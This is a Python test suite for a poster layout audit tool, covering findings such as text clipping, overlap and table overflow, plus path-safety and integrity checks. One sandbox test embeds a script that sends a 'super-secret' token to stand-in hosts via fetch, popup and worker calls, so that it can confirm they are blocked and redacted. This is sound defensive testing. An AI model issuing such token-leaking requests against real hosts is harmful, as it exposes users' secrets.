from __future__ import annotations

import importlib.util
import json
import os
import shutil
import tempfile
import textwrap
import unittest
from pathlib import Path
from unittest import mock

from tests import test_autodesign_poster_skill as poster_skill_fixtures


REPO_ROOT = Path(__file__).resolve().parents[1]
SKILL_ROOT = REPO_ROOT / "agent_skills" / "autodesign-poster"
DOM_AUDIT_PATH = SKILL_ROOT / "scripts" / "poster_dom_audit.py"


def _load_dom_audit(test_case: unittest.TestCase):
    test_case.assertTrue(
        DOM_AUDIT_PATH.is_file(), "standalone Poster DOM audit module is missing"
    )
    module_name = "autodesign_portable_poster_dom_audit_test"
    spec = importlib.util.spec_from_file_location(module_name, DOM_AUDIT_PATH)
    test_case.assertIsNotNone(spec)
    test_case.assertIsNotNone(spec.loader if spec else None)
    module = importlib.util.module_from_spec(spec)
    previous = __import__("sys").dont_write_bytecode
    __import__("sys").dont_write_bytecode = True
    try:
        assert spec is not None and spec.loader is not None
        spec.loader.exec_module(module)
    finally:
        __import__("sys").dont_write_bytecode = previous
    return module


def _rect(x: float, y: float, w: float, h: float) -> dict[str, float]:
    return {"x": x, "y": y, "w": w, "h": h, "right": x + w, "bottom": y + h}


def _snapshot(*, media: str = "screen") -> dict[str, object]:
    return {
        "media": media,
        "viewport": {
            "width": 1000,
            "height": 600,
            "document_width": 1000,
            "document_height": 600,
        },
        "root": {
            "block_id": "paper-poster-root",
            "rect": _rect(0, 0, 1000, 600),
            "scrollWidth": 1000,
            "scrollHeight": 600,
            "clientWidth": 1000,
            "clientHeight": 600,
            "overflowX": "hidden",
            "overflowY": "hidden",
        },
        "text_nodes": [],
        "elements": [],
        "images": [],
        "tables": [],
        "lists": [],
        "panels": [],
        "source_flows": [],
    }


class PosterDomPureEvaluatorTests(unittest.TestCase):
    def setUp(self) -> None:
        self.audit = _load_dom_audit(self)
        self.canvas = {"width_px": 1000, "height_px": 600}
        self.print_size = {"width_mm": 264.5833, "height_mm": 158.75}

    def _evaluate(
        self,
        screen: dict[str, object],
        print_snapshot: dict[str, object] | None = None,
    ) -> dict[str, object]:
        return self.audit.evaluate_dom_snapshot(
            screen,
            print_snapshot or _snapshot(media="print"),
            canvas=self.canvas,
            print_size=self.print_size,
        )

    def _codes(self, result: dict[str, object]) -> list[str]:
        return [str(item["code"]) for item in result["findings"]]

    def test_valid_dense_snapshot_is_deterministic_and_has_no_findings(self) -> None:
        screen = _snapshot()
        screen["text_nodes"] = [
            {
                "block_id": "method-copy",
                "text": "A complete method explanation with grounded evidence.",
                "rect": _rect(40, 80, 420, 80),
                "visible_rect": _rect(40, 80, 420, 80),
                "clipped_by": "",
            },
            {
                "block_id": "result-copy",
                "text": "A primary result with a bounded scientific takeaway.",
                "rect": _rect(540, 360, 400, 80),
                "visible_rect": _rect(540, 360, 400, 80),
                "clipped_by": "",
            },
        ]
        first = self._evaluate(screen)
        second = self._evaluate(json.loads(json.dumps(screen)))
        self.assertEqual(first, second)
        self.assertEqual((first["passed"], first["findings"]), (True, []))

    def test_all_stable_finding_codes_have_the_exact_contract(self) -> None:
        cases: dict[str, tuple[dict[str, object], dict[str, object]]] = {}

        root_overflow = _snapshot()
        root_overflow["root"]["scrollHeight"] = 690
        cases["poster-dom-root-overflow"] = (root_overflow, _snapshot(media="print"))

        clipping = _snapshot()
        clipping["text_nodes"] = [
            {
                "block_id": "clipped-copy",
                "text": "This grounded text is visibly clipped by its panel.",
                "rect": _rect(40, 60, 360, 80),
                "visible_rect": _rect(40, 60, 360, 42),
                "clipped_by": "method-panel",
            }
        ]
        cases["poster-dom-text-clipping"] = (clipping, _snapshot(media="print"))

        overlap = _snapshot()
        overlap["text_nodes"] = [
            {
                "block_id": "left-copy",
                "text": "First editable text block with grounded content.",
                "rect": _rect(50, 100, 300, 90),
                "visible_rect": _rect(50, 100, 300, 90),
                "clipped_by": "",
            },
            {
                "block_id": "right-copy",
                "text": "Second editable text block collides with the first.",
                "rect": _rect(250, 120, 300, 90),
                "visible_rect": _rect(250, 120, 300, 90),
                "clipped_by": "",
            },
        ]
        cases["poster-dom-text-overlap"] = (overlap, _snapshot(media="print"))

        escaped = _snapshot()
        escaped["elements"] = [
            {
                "block_id": "escaped-result",
                "tag": "section",
                "role": "result",
                "class_name": "poster-section",
                "text": "Grounded result",
                "rect": _rect(940, 120, 120, 180),
            }
        ]
        cases["poster-dom-viewport-escape"] = (escaped, _snapshot(media="print"))

        blank_band = _snapshot()
        blank_band["panels"] = [
            {
                "block_id": "blank-panel",
                "rect": _rect(20, 20, 440, 520),
                "word_count": 150,
                "content_rects": [_rect(40, 40, 400, 120), _rect(40, 180, 400, 80)],
            }
        ]
        cases["poster-dom-blank-band"] = (blank_band, _snapshot(media="print"))

        sparse = _snapshot()
        sparse["panels"] = [
            {
                "block_id": "sparse-panel",
                "rect": _rect(20, 20, 440, 520),
                "word_count": 9,
                "content_rects": [_rect(40, 40, 120, 50)],
            }
        ]
        cases["poster-dom-sparse-oversized-panel"] = (sparse, _snapshot(media="print"))

        low_resolution = _snapshot()
        low_resolution["images"] = [
            {
                "block_id": "method-figure",
                "source_id": "vis-0001",
                "rect": _rect(80, 100, 400, 300),
                "complete": True,
                "naturalWidth": 420,
                "naturalHeight": 315,
            }
        ]
        cases["poster-dom-image-low-effective-resolution"] = (
            low_resolution,
            _snapshot(media="print"),
        )

        table_overflow = _snapshot()
        table_overflow["tables"] = [
            {
                "block_id": "results-table",
                "rect": _rect(80, 160, 420, 180),
                "scrollWidth": 560,
                "scrollHeight": 180,
                "clientWidth": 420,
                "clientHeight": 180,
                "overflowX": "hidden",
                "overflowY": "visible",
                "font_px": 24,
            }
        ]
        cases["poster-dom-table-overflow"] = (table_overflow, _snapshot(media="print"))

        small_table_text = _snapshot()
        small_table_text["tables"] = [
            {
                "block_id": "tiny-table",
                "rect": _rect(80, 160, 420, 180),
                "scrollWidth": 420,
                "scrollHeight": 180,
                "clientWidth": 420,
                "clientHeight": 180,
                "overflowX": "visible",
                "overflowY": "visible",
                "font_px": 23.5,
            }
        ]
        cases["poster-dom-table-text-small"] = (
            small_table_text,
            _snapshot(media="print"),
        )

        bad_gutter = _snapshot()
        bad_gutter["lists"] = [
            {
                "block_id": "method-readout",
                "rect": _rect(260, 120, 220, 200),
                "item_count": 3,
                "has_source_flow_ancestor": True,
                "is_direct_source_flow_child": True,
                "has_floated_source_sibling": True,
                "paddingInlineStartPx": 8,
                "paddingLeftPx": 8,
                "textIndentPx": -3,
            }
        ]
        cases["poster-dom-source-flow-gutter"] = (bad_gutter, _snapshot(media="print"))

        bad_sibling = _snapshot()
        bad_sibling["source_flows"] = [
            {
                "block_id": "method-flow",
                "rect": _rect(40, 80, 440, 360),
                "source_child_count": 1,
                "readout_child_count": 1,
                "direct_sibling": False,
            }
        ]
        cases["poster-dom-source-flow-sibling"] = (
            bad_sibling,
            _snapshot(media="print"),
        )

        print_mismatch = _snapshot(media="print")
        print_mismatch["root"]["rect"] = _rect(0, 0, 900, 600)
        print_mismatch["root"]["clientWidth"] = 900
        print_mismatch["root"]["scrollWidth"] = 900
        cases["poster-dom-screen-print-mismatch"] = (_snapshot(), print_mismatch)

        boxy = _snapshot()
        boxy["elements"] = [
            {
                "block_id": f"metric-card-{index:02d}",
                "tag": "div",
                "role": "metric",
                "class_name": "metric-card",
                "text": "Grounded metric result",
                "word_count": 3,
                "rect": _rect(20 + (index % 5) * 180, 30 + (index // 5) * 110, 150, 80),
                "border_width_px": 1,
                "background_distinct": True,
                "has_shadow": False,
            }
            for index in range(10)
        ]
        cases["poster-dom-template-boxiness"] = (boxy, _snapshot(media="print"))

        expected_codes = {
            "poster-dom-root-overflow",
            "poster-dom-text-clipping",
            "poster-dom-text-overlap",
            "poster-dom-viewport-escape",
            "poster-dom-blank-band",
            "poster-dom-sparse-oversized-panel",
            "poster-dom-image-low-effective-resolution",
            "poster-dom-table-overflow",
            "poster-dom-table-text-small",
            "poster-dom-source-flow-gutter",
            "poster-dom-source-flow-sibling",
            "poster-dom-screen-print-mismatch",
            "poster-dom-template-boxiness",
        }
        self.assertEqual(set(cases), expected_codes)
        for expected_code, (screen, print_snapshot) in cases.items():
            with self.subTest(code=expected_code):
                result = self._evaluate(screen, print_snapshot)
                self.assertIn(expected_code, self._codes(result), result)
                finding = next(
                    item for item in result["findings"] if item["code"] == expected_code
                )
                self.assertEqual(
                    set(finding),
                    {
                        "code",
                        "block_id",
                        "severity",
                        "geometry",
                        "message",
                        "suggested_repair_route",
                    },
                )
                self.assertEqual(finding["suggested_repair_route"], "layout_repair")
                self.assertIsInstance(finding["geometry"], dict)

    def test_table_container_escape_uses_the_table_overflow_code(self) -> None:
        screen = _snapshot()
        screen["tables"] = [
            {
                "block_id": "escaped-table",
                "rect": _rect(80, 160, 460, 180),
                "container_rect": _rect(80, 160, 400, 180),
                "scrollWidth": 460,
                "scrollHeight": 180,
                "clientWidth": 460,
                "clientHeight": 180,
                "overflowX": "visible",
                "overflowY": "visible",
                "font_px": 24,
            }
        ]

        result = self._evaluate(screen)

        finding = next(
            item
            for item in result["findings"]
            if item["code"] == "poster-dom-table-overflow"
        )
        self.assertGreater(finding["geometry"]["container_escape_px"], 8)

    def test_scroll_gaps_compare_scroll_size_to_the_client_box(self) -> None:
        root_screen = _snapshot()
        root_screen["root"]["rect"] = _rect(0, 0, 1006, 600)
        root_screen["root"]["scrollWidth"] = 1005
        root_screen["root"]["clientWidth"] = 1000
        self.assertIn(
            "poster-dom-root-overflow", self._codes(self._evaluate(root_screen))
        )

        table_screen = _snapshot()
        table_screen["tables"] = [
            {
                "block_id": "bordered-overflow-table",
                "rect": _rect(80, 160, 426, 180),
                "container_rect": _rect(60, 140, 500, 220),
                "scrollWidth": 425,
                "scrollHeight": 176,
                "clientWidth": 420,
                "clientHeight": 176,
                "font_px": 24,
            }
        ]
        self.assertIn(
            "poster-dom-table-overflow", self._codes(self._evaluate(table_screen))
        )

    def test_sparse_large_panel_uses_the_rendered_content_area_threshold(self) -> None:
        screen = _snapshot()
        screen["panels"] = [
            {
                "block_id": "underfilled-panel",
                "rect": _rect(20, 20, 440, 520),
                "word_count": 80,
                "content_rects": [_rect(40, 40, 120, 50)],
            }
        ]

        result = self._evaluate(screen)

        self.assertIn("poster-dom-sparse-oversized-panel", self._codes(result))

    def test_source_flow_requires_direct_source_readout_and_evidence_binding(self) -> None:
        cases = (
            (1, 1, True, False),
            (1, 1, True, None),
            (0, 1, False, False),
        )
        for source_count, readout_count, direct_sibling, evidence_value in cases:
            with self.subTest(
                source_count=source_count,
                readout_count=readout_count,
                direct_sibling=direct_sibling,
                evidence_ids_intersect=evidence_value,
            ):
                screen = _snapshot()
                flow = {
                    "block_id": "method-flow",
                    "rect": _rect(40, 80, 440, 360),
                    "source_child_count": source_count,
                    "readout_child_count": readout_count,
                    "direct_sibling": direct_sibling,
                }
                if evidence_value is not None:
                    flow["evidence_ids_intersect"] = evidence_value
                screen["source_flows"] = [flow]

                result = self._evaluate(screen)

                self.assertIn("poster-dom-source-flow-sibling", self._codes(result))

    def test_screen_print_parity_also_requires_the_screen_canvas(self) -> None:
        screen = _snapshot()
        screen["root"]["rect"] = _rect(0, 0, 900, 600)
        screen["root"]["clientWidth"] = 900
        screen["root"]["scrollWidth"] = 900

        result = self._evaluate(screen)

        self.assertIn("poster-dom-screen-print-mismatch", self._codes(result))


class PosterDomRunnerTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary.name)
        self.audit = _load_dom_audit(self)
        self.harness = poster_skill_fixtures._load_harness()

    def tearDown(self) -> None:
        self.temporary.cleanup()

    def _run(self, name: str) -> tuple[Path, str, Path]:
        run = self.root / name
        source = self.root / f"{name}.txt"
        source.write_text(
            "Grounded poster source reports 85% accuracy and uses two-stage routing. "
            "The grounded poster retains accuracy.",
            encoding="utf-8",
        )
        self.harness.initialize_poster_run(run, source)
        evidence_id = str(self.harness.core.load_evidence(run)[0]["id"])
        selection = {
            "run_format_version": 2,
            "assets": [],
            "source_story": {
                key: {
                    "status": "not_applicable",
                    "asset_ids": [],
                    "evidence_ids": [evidence_id],
                    "rationale": f"The reviewed source has no distinct {key} visual region.",
                }
                for key in ("central_method", "primary_result")
            },
        }
        context = self.harness.create_poster_source_review_context(run, selection)
        review = {
            "run_format_version": 2,
            "source_review_context_sha256": context["context_sha256"],
            "reviewer_kind": "fresh_subagent",
            "dimension_scores": {
                "importance": 4,
                "crop_completeness": 4,
                "caption_claim_match": 4,
                "label_axis_legend_readability": 4,
                "duplicate_or_ornamental_content": 4,
                "method_result_coverage": 4,
                "poster_area_fit": 4,
            },
            "asset_findings": [],
            "coverage_findings": [],
            "blockers": [],
            "localized_repairs": [],
            "verdict": "pass",
            "complete": True,
        }
        self.harness.record_poster_source_review(
            run, context["context_path"], review
        )
        self.harness.save_poster_plan(run, poster_skill_fixtures._plan())
        attempt = self.harness.begin_poster_attempt(run)["attempt_id"]
        artifact = run / "attempts" / attempt / "artifact"
        (artifact / "poster.html").write_text(
            poster_skill_fixtures._poster_html(), encoding="utf-8"
        )
        return run, attempt, artifact

    def _probe_payload(self) -> dict[str, object]:
        screen = _snapshot()
        printed = _snapshot(media="print")
        for snapshot in (screen, printed):
            snapshot["viewport"] = {
                "width": 3072,
                "height": 1536,
                "document_width": 3072,
                "document_height": 1536,
            }
            snapshot["root"] = {
                **snapshot["root"],
                "rect": _rect(0, 0, 3072, 1536),
                "scrollWidth": 3072,
                "scrollHeight": 1536,
                "clientWidth": 3072,
                "clientHeight": 1536,
            }
        return {
            "screen_snapshot": screen,
            "print_snapshot": printed,
            "screenshots": {
                "screen": poster_skill_fixtures.AutoDesignPosterSkillTests._png(
                    8, 6, 30
                ),
                "print": poster_skill_fixtures.AutoDesignPosterSkillTests._png(
                    8, 6, 60
                ),
            },
            "diagnostics": {
                "blocked_requests": [],
                "blocked_popups": [],
                "blocked_workers": [],
                "console_errors": [],
                "request_errors": [],
                "page_errors": [],
            },
        }

    def _artifact_bytes(self, artifact: Path) -> dict[str, bytes]:
        return {
            path.relative_to(artifact).as_posix(): path.read_bytes()
            for path in artifact.rglob("*")
            if path.is_file()
        }

    def test_run_audit_writes_only_dom_qa_and_preserves_artifact_bytes(self) -> None:
        run, attempt, artifact = self._run("read-only-runner")
        before = self._artifact_bytes(artifact)
        with mock.patch.object(
            self.audit, "_invoke_browser_worker", return_value=self._probe_payload()
        ):
            report = self.audit.run_poster_dom_audit(
                run, attempt, cache_root=self.root / "browser", allow_browser_install=False
            )

        self.assertTrue(report["passed"], report)
        self.assertTrue(report["artifact_unchanged"])
        self.assertEqual(
            report["artifact_tree_sha256_before"],
            report["artifact_tree_sha256_after"],
        )
        self.assertEqual(self._artifact_bytes(artifact), before)
        qa = run / "attempts" / attempt / "qa"
        self.assertTrue((qa / "dom-audit.json").is_file())
        self.assertTrue((qa / "previews" / "dom-screen.png").is_file())
        self.assertTrue((qa / "previews" / "dom-print.png").is_file())
        self.assertEqual(
            {
                path.relative_to(qa).as_posix()
                for path in qa.rglob("*")
                if path.is_file()
            },
            {
                "dom-audit.json",
                "previews/dom-screen.png",
                "previews/dom-print.png",
            },
        )
        self.assertEqual(
            self.audit.load_verified_poster_dom_audit(run, attempt), report
        )

    def test_run_audit_rejects_symlinked_qa_without_outside_mutation(self) -> None:
        run, attempt, _artifact = self._run("symlink-qa")
        attempt_root = run / "attempts" / attempt
        outside = self.root / "outside-qa"
        outside.mkdir()
        marker = outside / "KEEP.txt"
        marker.write_bytes(b"keep")
        shutil.rmtree(attempt_root / "qa")
        (attempt_root / "qa").symlink_to(outside, target_is_directory=True)

        with self.assertRaises(self.harness.core.PathSafetyError):
            self.audit.run_poster_dom_audit(
                run, attempt, cache_root=self.root / "browser", allow_browser_install=False
            )

        self.assertEqual(marker.read_bytes(), b"keep")
        self.assertEqual({path.name for path in outside.iterdir()}, {"KEEP.txt"})

    def test_run_audit_rejects_hardlinked_artifact_without_outside_mutation(self) -> None:
        run, attempt, artifact = self._run("hardlink-artifact")
        outside = self.root / "outside-poster.html"
        outside.write_bytes((artifact / "poster.html").read_bytes())
        (artifact / "poster.html").unlink()
        os.link(outside, artifact / "poster.html")
        before = outside.read_bytes()

        with self.assertRaises(self.harness.core.PathSafetyError):
            self.audit.run_poster_dom_audit(
                run, attempt, cache_root=self.root / "browser", allow_browser_install=False
            )

        self.assertEqual(outside.read_bytes(), before)
        self.assertFalse(
            (run / "attempts" / attempt / "qa" / "dom-audit.json").exists()
        )

    def test_run_audit_detects_artifact_drift_before_persisting_results(self) -> None:
        run, attempt, artifact = self._run("artifact-drift")
        payload = self._probe_payload()

        def drift(**_kwargs: object) -> dict[str, object]:
            (artifact / "poster.html").write_text("changed", encoding="utf-8")
            return payload

        with mock.patch.object(self.audit, "_invoke_browser_worker", side_effect=drift):
            with self.assertRaises(self.harness.core.IntegrityError):
                self.audit.run_poster_dom_audit(
                    run,
                    attempt,
                    cache_root=self.root / "browser",
                    allow_browser_install=False,
                )

        self.assertFalse(
            (run / "attempts" / attempt / "qa" / "dom-audit.json").exists()
        )
        self.assertFalse(
            (run / "attempts" / attempt / "qa" / "previews" / "dom-screen.png").exists()
        )

    def test_verified_report_rejects_later_artifact_drift(self) -> None:
        run, attempt, artifact = self._run("verified-drift")
        with mock.patch.object(
            self.audit, "_invoke_browser_worker", return_value=self._probe_payload()
        ):
            self.audit.run_poster_dom_audit(
                run, attempt, cache_root=self.root / "browser", allow_browser_install=False
            )
        (artifact / "poster.html").write_text("changed", encoding="utf-8")

        with self.assertRaises(self.harness.core.IntegrityError):
            self.audit.load_verified_poster_dom_audit(run, attempt)

    def test_loading_a_missing_report_does_not_create_qa_directories(self) -> None:
        run, attempt, _artifact = self._run("missing-report")
        qa = run / "attempts" / attempt / "qa"
        shutil.rmtree(qa)

        with self.assertRaises(self.harness.core.PathSafetyError):
            self.audit.load_verified_poster_dom_audit(run, attempt)

        self.assertFalse(qa.exists())


@unittest.skipUnless(
    os.environ.get("AUTODESIGN_SKILL_REAL_BROWSER") == "1",
    "set AUTODESIGN_SKILL_REAL_BROWSER=1 to run pinned Chromium DOM tests",
)
class PosterDomRealBrowserTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary.name)
        self.audit = _load_dom_audit(self)
        self.harness = poster_skill_fixtures._load_harness()
        cache = os.environ.get("AUTODESIGN_SKILL_BROWSER_CACHE", "").strip()
        self.cache = Path(cache) if cache else Path.home() / ".cache/autodesign-skills/browser"

    def tearDown(self) -> None:
        self.temporary.cleanup()

    @staticmethod
    def _html(body: str, *, extra_style: str = "", script: str = "") -> str:
        return textwrap.dedent(
            f"""\
            <!doctype html>
            <html><head><meta charset="utf-8"><style>
            @page {{ size: 2133.6mm 1066.8mm; margin: 0; }}
            * {{ box-sizing: border-box; }}
            html, body {{ margin: 0; width: 3072px; height: 1536px; overflow: hidden; }}
            body {{ font-family: Arial, sans-serif; background: white; color: #18202a; }}
            .paper-poster {{ position: relative; width: 3072px; height: 1536px; overflow: hidden; }}
            p, li, td, th {{ font-size: 24px; line-height: 1.25; }}
            @media print {{
              html, body, .paper-poster {{ width: 3072px; height: 1536px; }}
            }}
            {extra_style}
            </style></head><body>
            <main class="paper-poster" data-autodesign-artifact="poster"
                  data-block-id="paper-poster-root" data-canvas-width="3072"
                  data-canvas-height="1536" data-print-width-mm="2133.6"
                  data-print-height-mm="1066.8">{body}</main>
            {script}
            </body></html>
            """
        )

    def _run(self, name: str, html: str) -> tuple[dict[str, object], bytes]:
        runner = PosterDomRunnerTests(methodName="runTest")
        runner.root = self.root
        runner.audit = self.audit
        runner.harness = self.harness
        run, attempt, artifact = runner._run(name)
        poster = artifact / "poster.html"
        poster.write_text(html, encoding="utf-8")
        before = poster.read_bytes()
        report = self.audit.run_poster_dom_audit(
            run,
            attempt,
            cache_root=self.cache,
            allow_browser_install=False,
        )
        self.assertEqual(poster.read_bytes(), before)
        self.assertEqual(poster.stat().st_nlink, 1)
        self.last_run = run
        self.last_attempt = attempt
        return report, before

    @staticmethod
    def _codes(report: dict[str, object]) -> set[str]:
        return {str(item["code"]) for item in report["findings"]}

    def test_valid_dense_poster_passes_and_binds_screen_and_print(self) -> None:
        paragraphs = "".join(
            f'<p data-block-id="copy-{index}" style="position:absolute;left:{80 + (index % 3) * 980}px;'
            f'top:{80 + (index // 3) * 170}px;width:850px;height:120px">'
            "Grounded methods, measured results, and bounded conclusions remain editable. "
            "Each source-backed block carries enough detail for a dense conference poster.</p>"
            for index in range(24)
        )
        report, _before = self._run("real-valid", self._html(paragraphs))

        self.assertTrue(report["passed"], report)
        self.assertEqual(report["findings"], [])
        self.assertTrue(report["artifact_unchanged"])
        self.assertEqual(
            {
                label: item["path"]
                for label, item in report["screenshots"].items()
            },
            {
                "screen": "qa/previews/dom-screen.png",
                "print": "qa/previews/dom-print.png",
            },
        )
        for item in report["screenshots"].values():
            self.assertRegex(str(item["sha256"]), r"^[0-9a-f]{64}$")
        attempt_root = self.last_run / "attempts" / self.last_attempt
        self.harness.core.write_source_map(
            self.last_run,
            self.last_attempt,
            poster_skill_fixtures._claims(),
        )
        (attempt_root / "artifact" / "poster.pdf").write_bytes(b"%PDF-fixture")
        (attempt_root / "artifact" / "preview.png").write_bytes(b"print-preview")
        (attempt_root / "qa" / "previews" / "poster-print.png").write_bytes(
            b"print-preview"
        )
        report = self.audit.run_poster_dom_audit(
            self.last_run,
            self.last_attempt,
            cache_root=self.cache,
            allow_browser_install=False,
        )
        self.assertEqual(
            self.audit.load_verified_poster_dom_audit(
                self.last_run, self.last_attempt
            ),
            report,
        )
        self.harness.core.record_deterministic_result(
            self.last_run,
            self.last_attempt,
            passed=True,
            checks=[{"id": "poster_dom_audit", "passed": True}],
            artifact_paths=[
                "artifact/poster.html",
                "artifact/poster.pdf",
                "artifact/preview.png",
            ],
            preview_paths={
                "poster_screen": "qa/previews/dom-screen.png",
                "poster_pdf": "qa/previews/poster-print.png",
            },
        )
        context = self.harness.create_poster_review_context(
            self.last_run, self.last_attempt
        )
        self.assertEqual(set(context["preview_hashes"]), {"poster_pdf", "poster_screen"})
        self.assertEqual(
            context["preview_hashes"]["poster_screen"],
            self.harness.core.sha256_file(
                attempt_root / "qa" / "previews" / "dom-screen.png"
            ),
        )
        self.assertEqual(
            context["preview_hashes"]["poster_pdf"],
            self.harness.core.sha256_file(
                attempt_root / "qa" / "previews" / "poster-print.png"
            ),
        )

    def test_required_rendered_defects_are_detected(self) -> None:
        transparent_png = (
            "data:image/png;base64,"
            "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M/wHwAF"
            "gAJ/l20ZKAAAAABJRU5ErkJggg=="
        )
        cases = {
            "poster-dom-text-clipping": self._html(
                '<div data-block-id="clip" style="position:absolute;left:80px;top:80px;'
                'width:700px;height:38px;overflow:hidden"><p style="margin:0">'
                "Grounded text continues across several rendered lines and must be visibly clipped "
                "inside this deliberately short authored container.</p></div>"
            ),
            "poster-dom-text-overlap": self._html(
                '<p data-block-id="left" style="position:absolute;left:80px;top:80px;width:700px">'
                "First grounded result overlaps another editable text block.</p>"
                '<p data-block-id="right" style="position:absolute;left:180px;top:90px;width:700px">'
                "Second grounded result overlaps the first editable text block.</p>"
            ),
            "poster-dom-blank-band": self._html(
                '<section data-block-id="blank-panel" style="position:absolute;left:80px;top:80px;'
                'width:900px;height:1000px"><p>Only one grounded line occupies this large panel.</p>'
                "</section>"
            ),
            "poster-dom-image-low-effective-resolution": self._html(
                f'<img data-block-id="low-res" src="{transparent_png}" alt="source result" '
                'style="position:absolute;left:80px;top:80px;width:600px;height:400px">'
            ),
            "poster-dom-table-overflow": self._html(
                '<div data-block-id="table-container" style="position:absolute;left:80px;top:80px;'
                'width:420px;overflow:hidden"><table data-block-id="wide-table" '
                'style="width:1000px"><tr><th>Grounded measure</th><th>Value</th></tr>'
                "<tr><td>Accuracy</td><td>85%</td></tr></table></div>"
            ),
            "poster-dom-source-flow-gutter": self._html(
                '<div class="source-flow-unit" data-block-id="method-flow" '
                'data-source-ids="ev-001"><figure data-source-id="vis-001" '
                'data-source-ids="ev-001" '
                'style="float:left;width:240px;height:180px"></figure>'
                '<ul data-block-id="method-readout" data-source-ids="ev-001" '
                'style="padding-inline-start:4px;text-indent:-4px"><li>Grounded method readout.</li>'
                "</ul></div>"
            ),
            "poster-dom-source-flow-sibling": self._html(
                '<div class="source-flow-unit" data-block-id="mismatched-flow">'
                '<figure data-source-id="vis-001" data-source-ids="ev-method" '
                'style="float:left;width:240px;height:180px"></figure>'
                '<div data-role="readout" data-source-id="vis-001" '
                'data-source-ids="ev-result">'
                "Grounded explanatory readout with mismatched evidence.</div></div>"
            ),
            "poster-dom-screen-print-mismatch": self._html(
                '<p data-block-id="copy">Grounded screen and print parity must hold.</p>',
                extra_style="@media print { .paper-poster { width: 2800px; height: 1536px; } }",
            ),
        }
        for expected, html in cases.items():
            with self.subTest(code=expected):
                report, _before = self._run(expected, html)
                self.assertIn(expected, self._codes(report), report)

    def test_network_popups_and_workers_are_blocked_with_sanitized_diagnostics(self) -> None:
        script = """
        <script>
        fetch('https://blocked.example/private?token=super-secret').catch(() => {});
        window.open('https://popup.example/private?token=super-secret');
        try { new Worker('https://worker.example/private.js?token=super-secret'); } catch (_) {}
        try {
          new Worker(URL.createObjectURL(new Blob(['self.postMessage("ready")'],
            {type: 'text/javascript'})));
        } catch (_) {}
        console.error('failed https://console.example/private?token=super-secret');
        </script>
        """
        report, _before = self._run(
            "blocked-browser-effects",
            self._html(
                '<p data-block-id="copy">Grounded browser diagnostics stay local.</p>',
                script=script,
            ),
        )

        diagnostics = report["browser_diagnostics"]
        self.assertTrue(diagnostics["blocked_requests"])
        self.assertTrue(diagnostics["blocked_popups"])
        self.assertTrue(diagnostics["blocked_workers"])
        serialized = json.dumps(diagnostics, sort_keys=True)
        self.assertNotIn("super-secret", serialized)
        self.assertNotIn(str(self.root), serialized)

    def test_boxiness_distinguishes_plain_white_flow_from_dark_filled_boxes(self) -> None:
        def boxes(background: str, color: str) -> str:
            return "".join(
                f'<div data-block-id="box-{index}" class="metric-unit" '
                f'style="position:absolute;left:{80 + (index % 5) * 560}px;'
                f'top:{80 + (index // 5) * 260}px;width:440px;height:180px;'
                f'background:{background};color:{color}">Grounded metric result</div>'
                for index in range(10)
            )

        white_report, _before = self._run(
            "plain-white-flow", self._html(boxes("rgb(255,255,255)", "#18202a"))
        )
        dark_report, _before = self._run(
            "dark-filled-boxes", self._html(boxes("rgb(0,0,0)", "#ffffff"))
        )

        self.assertNotIn("poster-dom-template-boxiness", self._codes(white_report))
        self.assertIn("poster-dom-template-boxiness", self._codes(dark_report))

    def test_measurement_script_contains_no_authored_dom_write_api(self) -> None:
        source = DOM_AUDIT_PATH.read_text(encoding="utf-8")
        self.assertNotIn("import autodesign", source)
        self.assertNotIn("from autodesign", source)
        for forbidden in (
            "setAttribute(",
            "removeAttribute(",
            "appendChild(",
            "insertBefore(",
            "replaceChildren(",
            ".style =",
            ".style=",
            ".style.setProperty(",
            ".classList.add(",
            ".classList.remove(",
            "insertRule(",
            "auto_fit",
            "autofit",
        ):
            with self.subTest(forbidden=forbidden):
                self.assertNotIn(forbidden, source)


if __name__ == "__main__":
    unittest.main()
